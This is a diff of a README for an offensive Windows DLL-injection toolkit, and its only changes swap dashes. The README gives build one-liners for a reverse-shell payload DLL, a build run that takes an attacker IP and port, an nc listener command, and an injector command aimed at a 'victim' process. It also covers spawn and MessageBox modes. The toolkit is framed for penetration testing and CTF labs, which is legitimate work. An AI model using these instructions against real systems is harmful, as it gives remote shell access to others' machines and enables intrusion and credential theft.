@@ -2,13 +2,13 @@
 
 Full DLL-injection toolkit for thick-client testing: the injector (both x64 and x86 builds), a reverse-shell payload DLL, and reusable source for building your own.
 
-**Technique**: DLL injection via `CreateRemoteThread + LoadLibraryA` (MITRE ATT&CK T1055.001). The injector allocates a buffer inside the target process, writes a DLL path into it, then starts a remote thread at `kernel32!LoadLibraryA` with that path as its argument — the target's own loader does the work. Once loaded, the DLL spawns a thread that does whatever you want: pop calc, open a reverse shell, dump creds, etc.
+**Technique**: DLL injection via `CreateRemoteThread + LoadLibraryA` (MITRE ATT&CK T1055.001). The injector allocates a buffer inside the target process, writes a DLL path into it, then starts a remote thread at `kernel32!LoadLibraryA` with that path as its argument - the target's own loader does the work. Once loaded, the DLL spawns a thread that does whatever you want: pop calc, open a reverse shell, dump creds, etc.
 
 ## Layout
 
 ```
 process-injection-2/
-├── pop.cpp                     flexible injector — target by PID/name,
+├── pop.cpp                     flexible injector - target by PID/name,
 ├── pop_x64.exe                    --dll / --spawn / --msg / --list modes.
 ├── pop_x86.exe                    colored output; arch-mismatch auto-switch.
 │
@@ -17,15 +17,15 @@ process-injection-2/
 │                               (x64/x86/ARM64/all), writes revshell_<arch>.dll.
 │
 └── reverse-shell/              reverse-shell payload DLL
-    ├── revshell_pure_dll.cpp   DLL — copies cmd.exe next to the host EXE,
+    ├── revshell_pure_dll.cpp   DLL - copies cmd.exe next to the host EXE,
     ├── revshell_pure_dll.dll   patches FileDescription, spawns renamed copy
     │                           (x64 build of the above .cpp)
-    ├── revshell_x86.dll        x86 (WOW64) build of the same .cpp —
+    ├── revshell_x86.dll        x86 (WOW64) build of the same .cpp -
     │                           used automatically if target is 32-bit
     └── build.ps1
 ```
 
-Keep **both DLLs in the same folder**. `pop.exe` auto-reads the target's arch and switches to whichever DLL matches — so one `--dll <path>` command injects into x64 and x86 targets alike.
+Keep **both DLLs in the same folder**. `pop.exe` auto-reads the target's arch and switches to whichever DLL matches - so one `--dll <path>` command injects into x64 and x86 targets alike.
 
 ## Config (in `reverse-shell/revshell_pure_dll.cpp`)
 
@@ -42,7 +42,7 @@ Edit these, rebuild the DLL.
 
 ## Build the DLL
 
-### Easiest — the interactive script (Linux)
+### Easiest - the interactive script (Linux)
 
 ```bash
 chmod +x build_revshell_dll.sh
@@ -55,7 +55,7 @@ The script:
 - shows an **arch menu**: `1) x64  2) x86  3) ARM64  4) all`
 - installs `mingw-w64` with `sudo apt` if missing (ARM64 prints a one-line hint for `llvm-mingw`)
 - writes `reverse-shell/revshell_<arch>.dll`
-- **never modifies the committed `.cpp`** — substitution happens on a temp copy
+- **never modifies the committed `.cpp`** - substitution happens on a temp copy
 
 Sample run:
 
@@ -65,8 +65,8 @@ Sample run:
 ? LHOST (attacker IP) [10.10.14.1]: 192.168.1.50
 ? LPORT (listener port) [4444]:
 Pick architecture:
-  1)  x64    (AMD64 — 99% of modern Windows targets)
-  2)  x86    (32-bit / WOW64 — legacy apps)
+  1)  x64    (AMD64 - 99% of modern Windows targets)
+  2)  x86    (32-bit / WOW64 - legacy apps)
   3)  ARM64  (Surface Pro X, newer ARM laptops)
   4)  all three
 ? choice [1]: 4
@@ -77,31 +77,31 @@ Pick architecture:
 [+] done  (settings saved to ./build_revshell_dll.conf)
 ```
 
-### Manual — one-liner per architecture
+### Manual - one-liner per architecture
 
 Pick the arch that **matches the target process**, not the injector. `pop.exe` prints the target's arch in its `[+] target` block at runtime.
 
-### Linux (Kali / Ubuntu / Debian — cross-compile)
+### Linux (Kali / Ubuntu / Debian - cross-compile)
 
-**x64** (AMD64 — 99% of modern Windows targets):
+**x64** (AMD64 - 99% of modern Windows targets):
 
 ```bash
 sudo apt install -y mingw-w64 && x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_x64.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
 ```
 
-**x86** (32-bit / WOW64 — legacy apps like Lightshot, old installers):
+**x86** (32-bit / WOW64 - legacy apps like Lightshot, old installers):
 
 ```bash
 sudo apt install -y mingw-w64 && i686-w64-mingw32-g++ -shared -O2 -s -o revshell_x86.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
 ```
 
-**ARM64** (Surface Pro X, newer ARM laptops — needs llvm-mingw, not in apt):
+**ARM64** (Surface Pro X, newer ARM laptops - needs llvm-mingw, not in apt):
 
 ```bash
 curl -LO https://github.com/mstorsjo/llvm-mingw/releases/latest/download/llvm-mingw-20231031-ucrt-ubuntu-20.04-x86_64.tar.xz && tar -xf llvm-mingw-*.tar.xz && ./llvm-mingw-*/bin/aarch64-w64-mingw32-g++ -shared -O2 -s -o revshell_arm64.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
 ```
 
-### Windows (MSVC — one line per arch, each in a fresh cmd)
+### Windows (MSVC - one line per arch, each in a fresh cmd)
 
 Set your VS path once as `VC` then reuse:
 
@@ -160,7 +160,7 @@ Run `pop.exe` once against the target to see its arch. The `[+] target` block sh
 | `arch x86 (WOW64)` | `revshell_x86.dll` | `pop_x86.exe` |
 | `arch ARM64` | build `revshell_arm64.dll` (see above) | *(ARM64 pop.exe build pending)* |
 
-**Tip**: put both DLLs in the same folder — `pop.exe` auto-switches to whichever matches the target's arch, so you can pass either one.
+**Tip**: put both DLLs in the same folder - `pop.exe` auto-switches to whichever matches the target's arch, so you can pass either one.
 
 ### 3. Start listener, fire the inject
 
@@ -170,15 +170,15 @@ nc -lvnp 4444
 ```
 
 ```powershell
-# Victim — auto-switches to revshell_x86.dll if target is 32-bit
+# Victim - auto-switches to revshell_x86.dll if target is 32-bit
 pop_x64.exe <PID_or_name> --dll revshell_pure_dll.dll
 ```
 
-Shell lands on your listener. Child process appears under the target as `RevShell - WinCmd Proc` (big text in Task Manager Processes tab) with image name `revShell.exe` — identifiable at a glance.
+Shell lands on your listener. Child process appears under the target as `RevShell - WinCmd Proc` (big text in Task Manager Processes tab) with image name `revShell.exe` - identifiable at a glance.
 
 ---
 
-## Other modes — spawn a small app as a child of the target
+## Other modes - spawn a small app as a child of the target
 
 Useful for PoC screenshots / demos (parent-child tree in Task Manager is the "proof"):
 
@@ -192,9 +192,9 @@ pop_x64.exe <target> --spawn "cmd /k whoami"      # spawn cmd running whoami
 pop_x64.exe <target> --spawn "cmd /k systeminfo"  # spawn cmd running systeminfo
 ```
 
-Same syntax for `pop_x86.exe` against x86 targets. The spawn chain is pure shellcode (`WinExec`), so no DLL is required and arch-mismatch rules don't apply here — any program in `PATH` works.
+Same syntax for `pop_x86.exe` against x86 targets. The spawn chain is pure shellcode (`WinExec`), so no DLL is required and arch-mismatch rules don't apply here - any program in `PATH` works.
 
-## MessageBox mode — visible banner inside the target
+## MessageBox mode - visible banner inside the target
 
 ```powershell
 pop_x64.exe explorer "I was here"
@@ -250,7 +250,7 @@ Flags: `--list` lists every injectable PID with arch; `--msg "text"` pops a Mess
 | Any 64-bit PC / laptop / server | x64 | yes (99%) | `revshell_x64.dll` + `pop_x64.exe` |
 | Legacy 32-bit apps (Lightshot, old installers) | x86 | some | `revshell_x86.dll` + `pop_x86.exe` |
 | Surface Pro X, newer ARM laptops | ARM64 | growing | `revshell_arm64.dll` |
-| Windows RT tablets | ARM | dead | — |
+| Windows RT tablets | ARM | dead | - |
 
 For a CTF/lab, shipping x64 + x86 covers ~100% of what you'll meet.
 
